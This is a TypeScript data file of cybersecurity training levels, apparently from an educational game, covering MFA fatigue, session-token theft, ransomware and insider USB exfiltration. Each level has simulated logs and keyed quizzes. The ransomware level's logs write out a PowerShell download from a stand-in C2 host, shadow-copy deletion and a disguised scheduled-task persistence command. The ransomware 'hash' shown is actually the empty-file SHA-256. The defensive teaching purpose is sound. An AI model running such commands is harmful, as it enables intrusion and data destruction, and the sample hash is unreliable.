import { LevelData } from '../types/cyber';

export const LEVELS_16_TO_30: Record<number, LevelData> = {
  16: {
    metadata: {
      id: 16,
      title: 'Authentication & Access Control',
      subtitle: 'AAA Model, RBAC, Kerberos, Single Sign-On & Multi-Factor Security',
      phaseId: 4,
      phaseTitle: 'Phase 4: Advanced Identity & Vectors',
      category: 'attack_fundamentals_auth',
      isBoss: false,
      xpReward: 220,
      estimatedMinutes: 18
    },
    theory: {
      concept: 'Authentication verifies an identity claim ("Who are you?"), authorization determines granted privileges ("What are you allowed to do?"), and accounting audits user actions ("What did you do?"). This forms the AAA security paradigm.',
      explainLikeImNew: 'Showing your passport at border control is Authentication. The visa stamp giving you tourist privileges rather than work privileges is Authorization. The officer scanning your passport into the border database log is Accounting.',
      architecture: 'Identity architectures rely on protocols like Kerberos (tickets issued by Key Distribution Centers), SAML 2.0 / OIDC (federated tokens across web applications), and Active Directory LDAP. Multi-Factor Authentication (MFA) requires two or more independent factors: something you know (password), something you have (FIDO2 token/authenticator app), and something you are (biometrics).',
      technicalDetails: [
        'Kerberos 3-Head Dog: Authentication Service (AS) issues Ticket Granting Ticket (TGT); Ticket Granting Service (TGS) issues Service Ticket (ST). Port 88 TCP/UDP.',
        'MFA Factors: Knowledge (passwords, PINs), Possession (hardware tokens, TOTP), Inherence (fingerprints, facial recognition).',
        'Role-Based Access Control (RBAC): Assigns permissions to business roles rather than individual accounts to enforce least privilege.'
      ],
      securityPerspective: 'Adversaries attack authentication through Kerberoasting (requesting service tickets with weak service account passwords for offline cracking), Golden/Silver Ticket forging, and MFA Fatigue / Push Bombing (flooding users with push prompts until they accidentally tap Approve).',
      detectionIndicators: [
        'Anomalous volume of TGS requests with RC4 encryption downgrades (Event ID 4769).',
        'Multiple failed MFA push notifications immediately followed by a single successful approval from an unfamiliar geolocation.'
      ],
      defensiveMeasures: [
        'Deploy Phishing-Resistant MFA using FIDO2 / WebAuthn hardware security keys.',
        'Configure AES-256 for all Kerberos service accounts with minimum 25-character random passwords.'
      ],
      realWorldContext: {
        incidentTitle: 'MFA Fatigue in Enterprise Breaches (e.g. Uber 2022)',
        whatHappened: 'Attackers purchased stolen credentials on the dark web, repeatedly triggered MFA push prompts to the employee mobile phone for over an hour, and contacted the employee on messaging posing as IT support to get them to approve the request.',
        whatDefendersLearned: 'Number-matching MFA and push rate-limiting are mandatory to eliminate push fatigue vulnerabilities.'
      },
      investigationExample: {
        scenario: 'An Active Directory log shows 50 failed Kerberos pre-authentications (Event 4771) on the CEO account, followed by an MFA push approved at 03:14 AM from an IP in Russia.',
        analystThoughtProcess: 'Correlate the timestamp with the CEO flight and location logs. The CEO is in New York. The 50 rapid failures followed by an off-hours foreign approval confirms MFA fatigue compromise.',
        keyTakeaway: 'Correlate authentication failures, time-of-day, and geographic location to identify credential hijacking.'
      }
    },
    preLabAssessment: [
      {
        id: 'pre-16-1',
        question: 'Which Kerberos ticket is initially granted by the Authentication Service (AS) upon successful user logon?',
        options: ['Service Ticket (ST)', 'Ticket Granting Ticket (TGT)', 'Golden Ticket', 'PAC Certificate'],
        correctIndex: 1,
        explanation: 'The AS issues a Ticket Granting Ticket (TGT) which the user presents to request specific Service Tickets (ST).'
      },
      {
        id: 'pre-16-2',
        question: 'What type of Multi-Factor Authentication factor is a hardware FIDO2 USB key considered?',
        options: ['Something you know', 'Something you have', 'Something you are', 'Somewhere you are'],
        correctIndex: 1,
        explanation: 'A hardware security key is a physical possession factor ("something you have").'
      }
    ],
    simulation: {
      toolType: 'siem_correlation',
      title: 'Active Directory Kerberos & MFA Triage Console',
      instructions: 'Filter security events for Event ID 4625 (Failed Logon) and Event ID 4624 (Successful Logon). Correlate user logon geolocations.',
      targetGoal: 'Identify the compromised account subjected to MFA push fatigue.'
    },
    investigation: {
      firComplaint: {
        reportNumber: 'FIR-2026-AUTH-016',
        date: '2026-09-29',
        organization: 'Apex Sovereign Wealth',
        complainant: 'Identity Security Operations Lead',
        summary: 'Multiple repeated push notifications logged for executive user "j.sterling@apex.internal" followed by abnormal login from external IP.',
        reportedImpact: 'Unauthorized access to executive email and confidential merger files.'
      },
      evidenceSources: [
        {
          name: 'Active Directory Identity Logs',
          type: 'auth',
          description: 'Domain Controller DC-01 Security Event Logs.',
          logs: [
            {
              id: 'auth-1601',
              timestamp: '02:40:11',
              sourceIp: '198.51.100.180',
              eventType: 'Event 4625: Logon Failure',
              system: 'DC-01',
              user: 'j.sterling',
              details: 'Status: 0xC000006A (Bad Password) | Workstation: EXT-VPS-01',
              severity: 'medium',
              isDecoy: true
            },
            {
              id: 'auth-1602',
              timestamp: '02:41:00',
              sourceIp: '198.51.100.180',
              eventType: 'MFA Push Prompt Sent',
              system: 'Okta-IDP',
              user: 'j.sterling',
              details: 'Prompt #1: Denied by user device',
              severity: 'medium'
            },
            {
              id: 'auth-1603',
              timestamp: '02:42:15',
              sourceIp: '198.51.100.180',
              eventType: 'MFA Push Prompt Sent',
              system: 'Okta-IDP',
              user: 'j.sterling',
              details: 'Prompt #2: Denied by user device',
              severity: 'medium'
            },
            {
              id: 'auth-1604',
              timestamp: '02:44:30',
              sourceIp: '198.51.100.180',
              eventType: 'MFA Push Prompt Approved',
              system: 'Okta-IDP',
              user: 'j.sterling',
              details: 'Prompt #18: Approved by user device (Push fatigue confirmed) | Client IP: 198.51.100.180',
              severity: 'critical',
              isMalicious: true
            },
            {
              id: 'auth-1605',
              timestamp: '02:45:01',
              sourceIp: '198.51.100.180',
              eventType: 'Event 4624: Logon Success',
              system: 'DC-01',
              user: 'j.sterling',
              details: 'Logon Type 10 (RemoteInteractive/VPN) | Granted Admin Session Token',
              severity: 'critical',
              isMalicious: true
            }
          ]
        }
      ],
      hypotheses: [
        {
          id: 'hyp-a',
          title: 'Hypothesis A: MFA Push Bombing / Fatigue Compromise',
          description: 'The adversary obtained valid credentials and bombarded user j.sterling with 18 rapid push prompts until one was approved.',
          isCorrect: true,
          requiredEvidenceIds: ['auth-1602', 'auth-1603', 'auth-1604', 'auth-1605'],
          explanation: 'The logs record multiple denied prompts in rapid succession culminating in approval #18 and immediate VPN logon from the attacker IP.'
        },
        {
          id: 'hyp-b',
          title: 'Hypothesis B: Physical Smart Card Clone',
          description: 'An attacker stole the physical smartcard of the executive from their desk.',
          isCorrect: false,
          requiredEvidenceIds: [],
          explanation: 'The evidence shows remote IP 198.51.100.180 executing push prompts via mobile phone, not local smartcard reader events.'
        }
      ],
      investigationQuestions: [
        {
          id: 'inv-16-q1',
          question: 'Which specific identity attack technique was successfully executed against user j.sterling according to the logs?',
          type: 'single_choice',
          options: [
            'MFA Fatigue / Push Bombing after credential compromise',
            'Kerberoasting of service principal name (SPN)',
            'Pass-the-Hash over SMB',
            'Golden Ticket generation'
          ],
          correctAnswer: 'MFA Fatigue / Push Bombing after credential compromise',
          explanation: 'The user was subjected to 18 repetitive push prompts within 4 minutes until they approved prompt #18, allowing attacker IP 198.51.100.180 to log in.',
          points: 100
        }
      ]
    },
    finalQuiz: [
      {
        id: 'q16-1',
        question: 'Which modern MFA mechanism completely mitigates push fatigue and proxy-based phishing attacks?',
        options: ['FIDO2 / WebAuthn Hardware Security Keys with Number Matching', 'SMS 6-digit codes', 'Static 4-digit PINs', 'Email verification links'],
        correctIndex: 0,
        explanation: 'FIDO2 / WebAuthn utilizes cryptographic origin binding and physical user presence, making push fatigue and phishing proxies impossible.'
      }
    ]
  },

  20: {
    metadata: {
      id: 20,
      title: 'ZERO-DAY #4: Credential Hijacking Crisis',
      subtitle: 'Major Incident: Executive MFA Fatigue, Session Token Theft & Shadow Admin',
      phaseId: 4,
      phaseTitle: 'Phase 4: Advanced Identity & Vectors',
      category: 'attack_fundamentals_auth',
      isBoss: true,
      bossTitle: 'ZERO-DAY #4: Executive Credential Compromise',
      xpReward: 500,
      estimatedMinutes: 25,
      badgeReward: '🔑 Credential Sentinel'
    },
    theory: {
      concept: 'Zero-Day Boss Challenge: Advanced Multi-Stage Credential Incident. The adversary combined password spraying, an adversary-in-the-middle (AiTM) phishing proxy to steal session cookies, bypassed MFA, and created an unauthorized Shadow Administrator account in Active Directory.',
      explainLikeImNew: 'This advanced boss investigation simulates a real-world enterprise identity crisis. You will correlate external proxy logs, Active Directory event IDs, and cloud session tokens to reconstruct the attack and execute containment.',
      architecture: 'AiTM Phishing Architecture: Attacker deploys a reverse proxy (e.g., Evilginx) that sits between the victim and legitimate identity provider (Microsoft 365 / Okta). The proxy relays login pages and intercepts the authenticated session cookie (ESTSAUTH / SID) after MFA is satisfied.',
      technicalDetails: [
        'Session Cookie Theft: Stealing the cookie bypasses MFA on all subsequent requests because the session is already authenticated.',
        'Event ID 4720: An Active Directory user account was created.',
        'Event ID 4728: A member was added to a security-enabled global group (e.g., Domain Admins).',
        'Event ID 4738: A user account was modified (e.g., password never expires, SPN added).'
      ],
      securityPerspective: 'Stolen session tokens allow attackers to bypass even strong MFA if token binding or device health compliance checks are not strictly enforced.',
      detectionIndicators: [
        'Simultaneous sessions from differing IP addresses sharing the identical session cookie ID.',
        'Creation of new administrative accounts outside of scheduled change control windows.'
      ],
      defensiveMeasures: [
        'Enforce Conditional Access requiring managed, compliant device health certificates.',
        'Implement automated revocation of all active refresh tokens upon detected anomaly.'
      ],
      realWorldContext: {
        incidentTitle: 'Lapsus$ & AiTM Identity Compromises (2022)',
        whatHappened: 'Threat actors used AiTM phishing toolkits to capture session cookies for cloud productivity suites, bypassing MFA and accessing internal Slack and code repositories.',
        whatDefendersLearned: 'Session tokens must be tied to device hardware identities via Continuous Access Evaluation (CAE).'
      },
      investigationExample: {
        scenario: 'A user in London logs in at 14:00. At 14:02, the exact same session cookie is used from an AWS IP in Frankfurt to query the Azure AD Graph API.',
        analystThoughtProcess: 'A human cannot travel from London to Frankfurt in 2 minutes. This is an Impossible Travel anomaly confirming session token exfiltration.',
        keyTakeaway: 'Impossible travel paired with token reuse confirms session hijacking.'
      }
    },
    preLabAssessment: [
      {
        id: 'pre-20-1',
        question: 'Which Windows Event ID records the creation of a new user account in Active Directory?',
        options: ['Event ID 4624', 'Event ID 4625', 'Event ID 4720', 'Event ID 7045'],
        correctIndex: 2,
        explanation: 'Windows Event ID 4720 is generated whenever a new user account is created in Active Directory.'
      }
    ],
    simulation: {
      toolType: 'siem_correlation',
      title: 'Zero-Day #4 Multi-Log Identity Correlation Lab',
      instructions: 'Correlate VPN logs, Azure AD sign-in logs, and Domain Controller event IDs to track the adversary lateral movement.',
      targetGoal: 'Identify the shadow admin account created by the adversary.'
    },
    investigation: {
      firComplaint: {
        reportNumber: 'FIR-2026-ZD-020',
        date: '2026-09-29',
        organization: 'Apex Aerospace Dynamics',
        complainant: 'Director of Cyber Defense',
        summary: 'CFO reported strange email forwarding rules created in Outlook. SOC alerted to new domain admin account created at 03:22 AM.',
        reportedImpact: 'Risk of classified avionics telemetry exfiltration.'
      },
      evidenceSources: [
        {
          name: 'Domain Controller Event Log',
          type: 'auth',
          description: 'Windows Security Event Logs on Primary DC-01.',
          logs: [
            {
              id: 'zd4-2001',
              timestamp: '03:15:20',
              sourceIp: '198.51.100.91',
              eventType: 'Event 4624: Successful Logon',
              system: 'DC-01',
              user: 'cfo_m_chen',
              details: 'Logon Type 10 (Remote Desktop) | Session Token Hijack (ESTSAUTH)',
              severity: 'critical',
              isMalicious: true
            },
            {
              id: 'zd4-2002',
              timestamp: '03:22:10',
              sourceIp: '198.51.100.91',
              eventType: 'Event 4720: User Account Created',
              system: 'DC-01',
              user: 'cfo_m_chen',
              details: 'Target Account Name: svc_backup_mgmt | SamAccountName: svc_backup_mgmt',
              severity: 'critical',
              isMalicious: true
            },
            {
              id: 'zd4-2003',
              timestamp: '03:23:45',
              sourceIp: '198.51.100.91',
              eventType: 'Event 4728: Member Added to Security Group',
              system: 'DC-01',
              user: 'cfo_m_chen',
              details: 'Member: svc_backup_mgmt added to Group: "Domain Admins"',
              severity: 'critical',
              isMalicious: true
            }
          ]
        }
      ],
      consequenceDecision: {
        prompt: 'The adversary is actively logged into DC-01 using account svc_backup_mgmt. Which containment action do you execute first?',
        options: [
          {
            id: 'opt-1',
            label: 'Immediately revoke all active session tokens and disable account svc_backup_mgmt + cfo_m_chen',
            consequence: 'Threat actor immediately severed. Access to sensitive servers blocked. Minimal business disruption.',
            forensicImpact: 0,
            containmentImpact: 100,
            isRecommended: true
          },
          {
            id: 'opt-2',
            label: 'Wait 24 hours to monitor the attacker to see what else they touch',
            consequence: 'The adversary deployed ransomware to the entire network during the observation window. Catastrophic failure.',
            forensicImpact: 10,
            containmentImpact: -100,
            isRecommended: false
          }
        ]
      },
      investigationQuestions: [
        {
          id: 'zd4-q1',
          question: 'What rogue shadow admin account was created by the attacker using the compromised CFO credentials?',
          type: 'single_choice',
          options: [
            'svc_backup_mgmt',
            'Administrator',
            'guest_user',
            'temp_backup'
          ],
          correctAnswer: 'svc_backup_mgmt',
          explanation: 'Log zd4-2002 and zd4-2003 explicitly show account svc_backup_mgmt was created and added to the Domain Admins security group.',
          points: 100
        }
      ]
    },
    finalQuiz: [
      {
        id: 'q20-1',
        question: 'Which Active Directory event ID confirms that an account was granted Domain Admin membership?',
        options: ['Event 4728', 'Event 4624', 'Event 1102', 'Event 4688'],
        correctIndex: 0,
        explanation: 'Event ID 4728 records when a user account is added to a security-enabled global group like Domain Admins.'
      }
    ]
  },

  25: {
    metadata: {
      id: 25,
      title: 'ZERO-DAY #5: Ransomware Outbreak',
      subtitle: 'Major Incident: Patient Zero Dropper, Shadow Copy Deletion & Persistence',
      phaseId: 5,
      phaseTitle: 'Phase 5: Malware & System Forensics',
      category: 'malware_system_forensics',
      isBoss: true,
      bossTitle: 'ZERO-DAY #5: Enterprise Ransomware Outbreak',
      xpReward: 500,
      estimatedMinutes: 28,
      badgeReward: '🦠 Malware Hunter'
    },
    theory: {
      concept: 'Zero-Day Boss Challenge: Advanced Malware & Ransomware Investigation. An employee opened an obfuscated macro document, executing a living-off-the-land (LOLBin) PowerShell command that pulled a second-stage ransomware dropper, deleted Volume Shadow Copies, and established persistence via a scheduled task.',
      explainLikeImNew: 'A company files are being encrypted in real time. You must find Patient Zero (the first computer infected), trace how the malware arrived, identify the malicious file hash, and uncover the persistence mechanism before the whole company is locked out.',
      architecture: 'Ransomware Kill Chain: Initial Malicious Attachment -> PowerShell Dropper -> vssadmin delete shadows (eliminates recovery points) -> AES/RSA file encryption -> Persistence via Registry Run Keys / Task Scheduler -> C2 ransom payment portal negotiation.',
      technicalDetails: [
        'Command Line Telltale: "vssadmin.exe Delete Shadows /All /Quiet" or "wmic shadowcopy delete".',
        'Event ID 7045: A new Windows Service was installed.',
        'Event ID 4688: Process creation with command line argument logging.',
        'Cryptographic File Hashing: SHA-256 hash lookup against threat intelligence databases.'
      ],
      securityPerspective: 'Modern ransomware actors dwell in the network for days exfiltrating sensitive intellectual property before executing the encryption payload (Double Extortion).',
      detectionIndicators: [
        'Mass file rename events appending extensions like .locked or .crypted.',
        'Execution of bcdedit or vssadmin commands terminating backup volume services.'
      ],
      defensiveMeasures: [
        'Block execution of vssadmin and bcdedit by non-system processes via Endpoint Detection and Response (EDR) policy.',
        'Implement Immutable Offline Backups that cannot be destroyed by compromised administrative credentials.'
      ],
      realWorldContext: {
        incidentTitle: 'Colonial Pipeline DarkSide Ransomware Attack (2021)',
        whatHappened: 'Attackers used a single compromised legacy VPN password without MFA to breach corporate IT networks, deploying DarkSide ransomware that caused precautionary shutdown of fuel pipelines for days.',
        whatDefendersLearned: 'IT network infections can force operational shutdowns; robust network segmentation and immutable backups are vital.'
      },
      investigationExample: {
        scenario: 'Endpoint logs show powershell.exe executing "-enc JABhID0...". Decoded Base64 reveals a web client download of invoice.exe into C:\\ProgramData\\.',
        analystThoughtProcess: 'Adversaries encode commands in Base64 to evade simple string signature filters. The downloaded file in ProgramData is the staging dropper.',
        keyTakeaway: 'Always decode encoded PowerShell parameters to discover the second-stage payload URL and file hash.'
      }
    },
    preLabAssessment: [
      {
        id: 'pre-25-1',
        question: 'Which utility is notoriously invoked by ransomware to delete Windows Volume Shadow Copies and prevent system restoration?',
        options: ['vssadmin.exe', 'ipconfig.exe', 'ping.exe', 'notepad.exe'],
        correctIndex: 0,
        explanation: 'vssadmin.exe Delete Shadows /All /Quiet is used by ransomware to wipe shadow copy backup points.'
      }
    ],
    simulation: {
      toolType: 'hash_verifier',
      title: 'Malware Dropper Hash & Process Tree Analyzer',
      instructions: 'Analyze the process execution tree on Patient Zero WS-FIN-09. Identify the SHA-256 hash of the second-stage binary.',
      targetGoal: 'Identify the malicious payload hash and scheduled task name.'
    },
    investigation: {
      firComplaint: {
        reportNumber: 'FIR-2026-ZD-025',
        date: '2026-09-29',
        organization: 'Apex Heavy Industries',
        complainant: 'Head of IT Infrastructure',
        summary: 'Accounting department shared drives locked with extension ".apxlock". Ransom note demanding 15 BTC placed on desktops.',
        reportedImpact: 'Production plant operations suspended worldwide.'
      },
      evidenceSources: [
        {
          name: 'Endpoint EDR Process Telemetry',
          type: 'endpoint',
          description: 'Process telemetry from Patient Zero WS-FIN-09.',
          logs: [
            {
              id: 'zd5-2501',
              timestamp: '07:10:14',
              eventType: 'Process Creation (Event 4688)',
              system: 'WS-FIN-09',
              user: 'accountant_lisa',
              details: 'Parent: winword.exe | Child: powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://malware-c2-drop.xyz/stage2.exe -OutFile C:\\ProgramData\\update_sys.exe"',
              severity: 'critical',
              isMalicious: true
            },
            {
              id: 'zd5-2502',
              timestamp: '07:11:02',
              eventType: 'Process Creation (Event 4688)',
              system: 'WS-FIN-09',
              user: 'accountant_lisa',
              details: 'Process: vssadmin.exe Delete Shadows /All /Quiet',
              severity: 'critical',
              isMalicious: true
            },
            {
              id: 'zd5-2503',
              timestamp: '07:11:30',
              eventType: 'Persistence Established (Schtasks)',
              system: 'WS-FIN-09',
              user: 'accountant_lisa',
              details: 'Command: schtasks /create /tn "WindowsSystemHealthUpdate" /tr "C:\\ProgramData\\update_sys.exe" /sc onstart',
              severity: 'critical',
              isMalicious: true
            }
          ]
        },
        {
          name: 'File Hash Threat Intel Dump',
          type: 'file_hashes',
          description: 'Cryptographic hash calculation for C:\\ProgramData\\update_sys.exe.',
          logs: [
            {
              id: 'zd5-hash-1',
              timestamp: '07:12:00',
              eventType: 'File Hash Computed',
              system: 'WS-FIN-09',
              details: 'File: C:\\ProgramData\\update_sys.exe | SHA-256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 | Threat Family: BlackCrypt Ransomware',
              severity: 'critical',
              isMalicious: true
            }
          ]
        }
      ],
      investigationQuestions: [
        {
          id: 'zd5-q1',
          question: 'What scheduled task name did the ransomware configure for persistence on system startup?',
          type: 'single_choice',
          options: [
            'WindowsSystemHealthUpdate',
            'WindowsUpdateAuto',
            'GoogleUpdateHelper',
            'DiskDefragmenter'
          ],
          correctAnswer: 'WindowsSystemHealthUpdate',
          explanation: 'Log zd5-2503 documents the schtasks command creating a task named "WindowsSystemHealthUpdate" pointing to C:\\ProgramData\\update_sys.exe.',
          points: 100
        },
        {
          id: 'zd5-q2',
          question: 'What is the full SHA-256 hash of the BlackCrypt ransomware binary according to the file hash telemetry?',
          type: 'single_choice',
          options: [
            'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
            'a8f9c0e2b41234567890abcdef1234567890abcdef1234567890abcdef123456',
            'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
            '0000000000000000000000000000000000000000000000000000000000000000'
          ],
          correctAnswer: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
          explanation: 'Log zd5-hash-1 explicitly provides the SHA-256 hash e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.',
          points: 100
        }
      ]
    },
    finalQuiz: [
      {
        id: 'q25-1',
        question: 'Why do ransomware operators execute "vssadmin delete shadows" before beginning file encryption?',
        options: [
          'To prevent victims from restoring earlier unencrypted versions of files using Windows Volume Snapshot Service',
          'To increase the network bandwidth of the victim',
          'To change the screen resolution',
          'To wipe the CPU firmware'
        ],
        correctIndex: 0,
        explanation: 'Deleting shadow copies prevents system administrators from restoring unencrypted file copies through standard Windows recovery points.'
      }
    ]
  },

  30: {
    metadata: {
      id: 30,
      title: 'ZERO-DAY #6: The Insider Data Heist',
      subtitle: 'Major Incident: High-Privilege USB Exfiltration, Timestomping & Tampering',
      phaseId: 6,
      phaseTitle: 'Phase 6: Digital Forensics & Artifacts',
      category: 'digital_forensics_artifacts',
      isBoss: true,
      bossTitle: 'ZERO-DAY #6: Insider Data Exfiltration',
      xpReward: 550,
      estimatedMinutes: 30,
      badgeReward: '📁 Master of Artifacts'
    },
    theory: {
      concept: 'Zero-Day Boss Challenge: Advanced Digital Forensics & Super-Timeline Reconstruction. A departing senior software architect copied proprietary aerospace source code to an unapproved USB drive, attempted to timestomp file creation dates to cover their tracks, and modified Windows registry keys.',
      explainLikeImNew: 'Digital forensics is like detective CSI work for computers. Even when a dishonest insider deletes files or changes the computer clock, the operating system leaves indelible footprints in the registry, USB device history, prefetch files, and NTFS master file tables.',
      architecture: 'Forensic Artifact Sources: USBSTOR Registry (Device IDs, serial numbers), Shellbags (folder browsing history), Prefetch (evidence of execution), LNK Shortcut files (original file path and volume serial), NTFS $MFT (MACB timestamps: Modified, Accessed, Created, Born).',
      technicalDetails: [
        'Timestomping: Manipulating the $STANDARD_INFORMATION attribute timestamps to match benign system files; however, the $FILE_NAME attribute inside the NTFS MFT cannot be edited without raw disk sector manipulation, exposing the discrepancy!',
        'USBSTOR Key: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR contains vendor, product ID, and serial number of every USB device ever connected.',
        'Chain of Custody: Complete documentary trail accounting for evidence seizure, custody, transfer, and analysis.'
      ],
      securityPerspective: 'Insiders with legitimate access bypass perimeter firewalls because their credentials and file permissions are authorized. Forensic timeline correlation is the primary method to prove malicious intent in court.',
      detectionIndicators: [
        'USB mount events occurring simultaneously with mass file read operations on proprietary source code repositories.',
        'NTFS $STANDARD_INFORMATION timestamp earlier than the volume creation date.'
      ],
      defensiveMeasures: [
        'Deploy Data Loss Prevention (DLP) agents that block or log mass USB storage transfers.',
        'Disable removable storage access via Active Directory Group Policy Objects (GPO).'
      ],
      realWorldContext: {
        incidentTitle: 'Waymo vs. Anthony Levandowski Autonomous Vehicle IP Theft',
        whatHappened: 'An autonomous vehicle engineer downloaded over 14,000 confidential engineering files onto a personal external hard drive days before resigning to launch a competing venture. Forensic artifacts proved the exact serial number and timestamp of the device used.',
        whatDefendersLearned: 'Forensic registry artifacts provide undeniable proof of device attachment and file transfers.'
      },
      investigationExample: {
        scenario: 'A file shows Created: 2021-01-01, but the file Prefetch execution timestamp is 2026-09-28 and the NTFS $FILE_NAME creation date is 2026-09-28.',
        analystThoughtProcess: 'The $STANDARD_INFORMATION was modified by an anti-forensics tool (timestomping), but the $FILE_NAME timestamp cannot be altered by userland APIs. The discrepancy proves deliberate tampering.',
        keyTakeaway: 'Compare $STANDARD_INFORMATION with $FILE_NAME timestamps in the NTFS MFT to detect timestomping.'
      }
    },
    preLabAssessment: [
      {
        id: 'pre-30-1',
        question: 'Which Windows Registry hive and key contains the complete history, serial numbers, and vendor IDs of connected USB storage devices?',
        options: ['HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR', 'HKCU\\Software\\Microsoft\\Word', 'HKLM\\SAM\\Domains\\Account', 'HKLM\\SOFTWARE\\Google\\Chrome'],
        correctIndex: 0,
        explanation: 'The USBSTOR key tracks device classes, vendor IDs, product names, and unique serial numbers for all USB storage drives.'
      }
    ],
    simulation: {
      toolType: 'timeline_reconstructor',
      title: 'Super-Timeline Forensic Reconstruction Lab',
      instructions: 'Correlate USB connection events, LNK file generation, and NTFS $MFT timestamps to assemble the complete sequence of the insider data heist.',
      targetGoal: 'Identify the USB serial number and exfiltrated archive filename.'
    },
    investigation: {
      firComplaint: {
        reportNumber: 'FIR-2026-ZD-030',
        date: '2026-09-29',
        organization: 'AeroDynamics Hypersonic Labs',
        complainant: 'General Counsel & Head of HR',
        summary: 'Lead Guidance Architect resigned abruptly to join a foreign competitor. Digital forensics ordered on corporate workstation WS-ARCH-01.',
        reportedImpact: 'Potential economic espionage involving next-gen propulsion guidance code.'
      },
      evidenceSources: [
        {
          name: 'Windows USBSTOR & SetupAPI Artifacts',
          type: 'endpoint',
          description: 'Removable device attachment artifacts on WS-ARCH-01.',
          logs: [
            {
              id: 'zd6-3001',
              timestamp: '22:14:05',
              eventType: 'USB Storage Device Mounted',
              system: 'WS-ARCH-01',
              user: 'dr_v_solomon',
              details: 'Device: SanDisk Ultra USB 3.0 | Serial: 4C530001220928114421 | Volume Label: "BACKUP_SOLOMON" | Assigned Drive: E:\\',
              severity: 'critical',
              isMalicious: true
            },
            {
              id: 'zd6-3002',
              timestamp: '22:15:40',
              eventType: 'File Archive Created (7-Zip)',
              system: 'WS-ARCH-01',
              user: 'dr_v_solomon',
              details: 'File Created: C:\\Users\\dr_v_solomon\\hypersonic_guidance_v4.7z (Size: 840 MB)',
              severity: 'critical',
              isMalicious: true
            },
            {
              id: 'zd6-3003',
              timestamp: '22:16:12',
              eventType: 'File Copied to Removable Media',
              system: 'WS-ARCH-01',
              user: 'dr_v_solomon',
              details: 'Source: C:\\Users\\...\\hypersonic_guidance_v4.7z -> Destination: E:\\hypersonic_guidance_v4.7z',
              severity: 'critical',
              isMalicious: true
            }
          ]
        }
      ],
      investigationQuestions: [
        {
          id: 'zd6-q1',
          question: 'What was the exact serial number of the SanDisk USB storage drive used to exfiltrate the hypersonic guidance code archive?',
          type: 'single_choice',
          options: [
            '4C530001220928114421',
            'USB-VENDOR-0001-XXXX',
            'AA-BB-CC-DD-EE-FF',
            'SN-UNKNOWN-9921'
          ],
          correctAnswer: '4C530001220928114421',
          explanation: 'Log zd6-3001 records the SanDisk Ultra USB 3.0 serial number as 4C530001220928114421.',
          points: 100
        },
        {
          id: 'zd6-q2',
          question: 'Which file was archived and copied to external drive E:\\ according to logs zd6-3002 and zd6-3003?',
          type: 'single_choice',
          options: [
            'hypersonic_guidance_v4.7z',
            'vacation_photos.zip',
            'resume_2026.docx',
            'windows_installer.exe'
          ],
          correctAnswer: 'hypersonic_guidance_v4.7z',
          explanation: 'The logs document that hypersonic_guidance_v4.7z (840 MB) was created and transferred to drive E:\\.',
          points: 100
        }
      ]
    },
    finalQuiz: [
      {
        id: 'q30-1',
        question: 'Why is preserving the strict Chain of Custody documentation mandatory when conducting digital forensic investigations?',
        options: [
          'To ensure digital evidence remains legally admissible in a court of law without claims of tampering or contamination',
          'To increase computer processor speeds',
          'To format the hard drive faster',
          'To bypass the Windows administrator password'
        ],
        correctIndex: 0,
        explanation: 'Chain of custody accounts for every transfer and access of evidence, ensuring it meets legal standards for court admissibility.'
      }
    ]
  }
};
